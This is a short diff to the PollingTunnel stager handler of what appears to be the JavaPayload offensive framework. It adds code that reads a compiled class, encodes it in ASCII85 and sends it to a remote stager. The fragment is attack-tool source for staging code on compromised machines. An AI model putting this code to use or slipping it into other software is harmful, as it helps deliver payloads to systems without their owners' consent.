@@ -34,6 +34,7 @@
 
 package javapayload.handler.stager;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.PipedInputStream;
 import java.io.PipedOutputStream;
@@ -41,6 +42,7 @@ import java.io.PrintStream;
 
 import javapayload.Parameter;
 import javapayload.handler.stage.StageHandler;
+import javapayload.stage.StreamForwarder;
 
 public class PollingTunnel extends StagerHandler implements Runnable {
 
@@ -71,6 +73,9 @@ public class PollingTunnel extends StagerHandler implements Runnable {
 			throw new IllegalArgumentException("No Communication interface found");
 		}
 		communicationInterface = (CommunicationInterface) extraArg;
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		StreamForwarder.forward(PollingTunnel.class.getResourceAsStream("/"+WrappedPipedOutputStream.class.getName().replace('.', '/')+".class"), baos);
+		communicationInterface.sendData("9"+javapayload.stager.PollingTunnel.encodeASCII85(baos.toByteArray()));
 		/* #JDK1.6 */try {
 			pipedIn = new PipedInputStream(4096);
 		} catch (NoSuchMethodError e) /**/{
